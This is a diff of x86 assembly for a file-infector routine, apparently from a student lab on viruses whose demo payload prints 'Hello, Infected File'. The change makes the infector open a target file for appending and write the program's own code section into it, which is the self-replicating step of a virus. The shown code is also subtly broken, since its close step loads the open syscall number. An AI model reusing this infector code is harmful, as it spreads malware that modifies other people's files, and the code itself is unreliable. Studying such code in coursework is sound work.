@@ -2,13 +2,11 @@ section	.rodata			; we define (global) read-only variables in .rodata section
 	output_string: db "Hello, Infected File"
     output_string_len: equ $ - output_string
 
-section .bss
-    write_address: resb 4  ; counter of write_address from code_start
-
 section .text
 global _start
 global system_call
 global infection
+global infector
 extern main
 _start:
     pop    dword ecx    ; ecx = argc
@@ -73,25 +71,20 @@ infector:
     sub     esp, 4          ; Leave space for local var on stack - opend file descibtor
     pushad                  ; Save some more caller state
     .open:
-        mov ebx, [ebp+12]       ; get path to reg
-        mov ecx, 0x400           ; push open file flags
+        mov ebx, [ebp+8]       ; get path to reg
+        mov ecx, 0x441           ; push open file flags
         mov eax, 5             ; push sys_call op_code
         int 0x80                ; open
     
     mov [ebp-4], eax        ; get fd returned value
-    mov dword [write_address], code_start         ; setting write_address to 0
     
     .write:
         mov eax, 4
         mov ebx, [ebp-4]
-        mov ecx, [write_address]
-        mov edx, [code_end - code_start]
-        int 0x80
-
-        ;inc byte [write_address]
-
-        ;cmp dword [write_address], code_end
-        ;jnz .write
+        mov ecx, code_start
+        mov edx, code_end
+        sub edx, code_start     ; size in edx of code_end-code_start
+        int 0x80      
     
     .close:
         mov eax, 5
